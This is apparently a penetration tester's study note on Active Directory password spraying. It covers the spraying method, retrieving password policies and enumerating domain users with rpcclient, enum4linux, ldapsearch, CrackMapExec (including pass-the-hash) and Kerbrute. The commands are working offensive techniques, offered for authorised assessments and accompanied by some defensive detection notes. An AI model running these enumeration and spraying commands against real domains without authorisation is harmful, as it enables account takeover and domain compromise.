# Password Spraying Overview
Password Spraying Summary

==Overview:==
- Attempt to log into exposed services using one common password with many usernames.
- Usernames may be gathered from OSINT or enumeration.
- Ideal for time-boxed assessments—can run alongside other tasks like poisoning or scanning.

==Scenario 1:==
- No SMB/LDAP enumeration possible.
- Used Kerbrute + username list (jsmith.txt + LinkedIn) to enumerate valid users.
- Sprayed with 'Welcome1', got low-privileged access.
- Used BloodHound to escalate to domain compromise.

==Scenario 2:==
- OSINT (LinkedIn) failed to yield usernames.
- Scraped PDFs via Google—discovered usernames follow "F9L8" (GUID-style).
- Bash script generated all combos (1,679,616 users):

 ```bash
   #!/bin/bash
    for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
        do echo $x;
    done
```

- Enumerated all users via Kerbrute.
- Found valid passwords; exploited RBCD + Shadow Credentials to compromise domain.

Password Spraying Considerations:
- Less aggressive than brute-force, but still risky.
- Insert delays to avoid lockouts (e.g., wait 30 min or more).
- Know the domain password policy (e.g., 5 failed attempts, 30 min lockout).
- Ask client if unsure about policy or enumerate internally if access exists.

Spray Pattern Example:
```bash
Step 1:
    bob@domain.local        Welcome1
    john@domain.local       Welcome1
    jane@domain.local       Welcome1
    (Delay)

Step 2:
    bob@domain.local        Passw0rd
    john@domain.local       Passw0rd
    jane@domain.local       Passw0rd
    (Delay)

Step 3:
    bob@domain.local        Winter2022
    john@domain.local       Winter2022
    jane@domain.local       Winter2022
```
==Best Practices:==
- Start with common passwords.
- Avoid account lockouts with delays.
- Consider spraying only once if risk is high.


---

# Enumerating & Retrieving Password Policies

## Enumerating the Password Policy - from Linux - Credentialed

we can pull the domain password policy in several ways, depending on how the domain is configured and whether or not we have valid domain credentials. With valid domain credentials

==**enumeration tools and the ports they use:**==

|Tool|Ports|
|---|---|
|nmblookup|137/UDP|
|nbtstat|137/UDP|
|net|139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535|
|rpcclient|135/TCP|
|smbclient|445/TCP|

### With valid domain credentials Or System access

>If you have `SYSTEM` access on a Windows host, then you can easily query Active Directory for this information. It’s possible to do this using the SYSTEM account because it can `impersonate` the computer. A computer object is treated as a domain user account

```bash
# using CrackMapExec
crackmapexec smb <DC-IP> -u avazquez -p Password123 --pass-pol # user creds 
# SYSTEM access on a Windows host
crackmapexec smb <DC-IP> -u <COMPUTER-NAME> -H <NTLM_HASH> --pass-pol


# using rpcclient
rpcclient -U <username>%<password> <DC-ip> # domain user creds
rpcclient -U <COMPUTER-NAME>%<NTLM_HASH> --pw-nt-hash <DC-ip> # or with SYSTEM access on Windows
  >$ getdompwinfo     # enum pwd policy 
  >$querydominfo      # get domain info 
```


### Without credentials

#### SMB NULL sessions

allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy from the ==Domain Controllers== 

**in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration.**

```bash
# using rpcclient
rpcclient -U "" -N <DC-IP>
  >$ getdompwinfo     # enum pwd policy 
  >$ querydominfo      # get domain info 

# Using enum4linux
enum4linux -P 172.16.5.5

# Using enum4linux-ng (python version of enum4linux)
enum4linux-ng -P 172.16.5.5 -oA ilfreight # -oA export data as YAML/JSON


--------------
# Enumerating Null Session - from Windows

net use \\DC01\ipc$ "" /u:""
 #> The command completed successfully # confirm if we can perform more of this type of attack.

net use \\DC01\ipc$ "" /u:guest
 # > System error 1331 has occurred # Error: Account is Disabled

net use \\DC01\ipc$ "password" /u:guest
  #> System error 1326 has occurred. #  Error: Password is Incorrect

net use \\DC01\ipc$ "password" /u:guest
  #> System error 1909 has occurred. # Error: Account is locked out (Password Policy)
```
####  LDAP Anonymous Bind

[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, uch as a complete listing of users, groups, computers, user account attributes, and the domain password policy. 

**This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.**

```bash
# Using ldapsearch
ldapsearch -h <DC-IP> -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
# Note: In newer versions of `ldapsearch`, the `-h` parameter was deprecated in favor for `-H`.
```


## Enumerating the Password Policy - from Windows

### With valid domain credentials Or System access
If we can authenticate to the domain from a Windows host or **or `SYSTEM` access on a Windows host** , we can use built-in Windows binaries such as `net.exe` to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.

```bash
# Using net.exe (built-in commands)
net accounts

# Using PowerView
import-module .\PowerView.ps1
Get-DomainPolicy
```

### Without credentials
#### SMB NULL sessions

```bash
# Enumerating Null Session - from Windows

net use \\DC01\ipc$ "" /u:""
 #> The command completed successfully # confirm if we can perform more of this type of attack.

net use \\DC01\ipc$ "" /u:guest
 # > System error 1331 has occurred # Error: Account is Disabled

net use \\DC01\ipc$ "password" /u:guest
  #> System error 1326 has occurred. #  Error: Password is Incorrect

net use \\DC01\ipc$ "password" /u:guest
  #> System error 1909 has occurred. # Error: Account is locked out (Password Policy)
```


## Analyzing the Password Policy

```bash
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
```


We've now pulled the password policy in numerous ways. Let's go through the policy for the INLANEFREIGHT.LOCAL domain piece by piece.

- The minimum password length is 8 (8 is very common, but nowadays, we are seeing more and more organizations enforce a 10-14 character password, which can remove some password options for us, but does not mitigate the password spraying vector completely)
- The account lockout threshold is 5 (it is not uncommon to see a lower threshold such as 3 or even no lockout threshold set at all)
- The lockout duration is 30 minutes (this may be higher or lower depending on the organization), so if we do accidentally lockout (avoid!!) an account, it will unlock after the 30-minute window passes
- Accounts unlock automatically (in some organizations, an admin must manually unlock the account). We never want to lockout accounts while performing password spraying, but we especially want to avoid locking out accounts in an organization where an admin would have to intervene and unlock hundreds (or thousands) of accounts by hand/script
- Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (`Password1` or `Welcome1` would satisfy the "complexity" requirement here, but are still clearly weak passwords).

The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:

|Policy|Default Value|
|---|---|
|Enforce password history|24 days|
|Maximum password age|42 days|
|Minimum password age|1 day|
|Minimum password length|7|
|Password must meet complexity requirements|Enabled|
|Store passwords using reversible encryption|Disabled|
|Account lockout duration|Not set|
|Account lockout threshold|0|
|Reset account lockout counter after|Not set|

>if we  cannot retrieve the policy using any of the methods shown here we should run **one**, max **two**, password spraying attempts


---
# Password Spraying - Making a Target User List

There are several ways that we can gather a target list of valid users:

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist
> don't forget to look for the domain password policy

### Without  Credentials 

If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory
#### SMB NULL sessions
```bash
# Using enum4linux
enum4linux -U <DC-IP>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Using rpcclient
rpcclient -U "" -N <DC-IP>
  $> enumdomusers
  # if enumdomusers are available use queryuser <RID>
    for i in $(seq 500 1100);do rpcclient -N -U "" <DC-IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
     # we can aslo use  lookupsid.py script (https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)

#### Using CrackMapExec
crackmapexec smb <DC-IP> --users
```

>`CrackMapExec` seful tool that will also show the `badpwdcount` (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the `baddpwdtime`, which is the date and time of the last bad password attempt, so we can see how close an account is to having its `badpwdcount` reset.

####  LDAP Anonymous Bind 

```bash 
# Using ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

# Using windapsearch
./windapsearch.py --dc-ip <DC-IP> -u "" -U # `-U` flag to retrieve just users.
```

#### Enumerating Users with Kerbrute
if we have no access at all from our position in the internal network, we can use `Kerbrute` to enumerate valid AD accounts and for password spraying.

To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a `PRINCIPAL UNKNOWN` error, the username does not exist. However, if the KDC responds with a **pre-authentication failed** , we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts. This generates a Windows event ID [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) if Kerberos logging is enabled.

Let's try out this method using the [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) wordlist of 48,705 possible common usernames in the format `flast (first letter of the first name+ full last name)` . The [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo is an excellent resource for this type of attack and contains a variety of different username lists that we can use to enumerate valid usernames using `Kerbrute`.

```bash
 kerbrute userenum -d inlanefreight.local --dc <DC-IP> /opt/jsmith.txt
```

>Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack


### With valid domain credentials Or System access
With valid credentials **or  System access to windows domain host** , we can use any of the tools stated previously to build a user list. A quick and easy way is using CrackMapExec.

```bash
# Using CrackMapExec with Valid domain User Credentials
sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --users 

# Using CrackMapExec with System access to windows domain host
crackmapexec smb <DC-IP> -u <COMPUTER-NAME> -H <NTLM_HASH>--users 
```


---

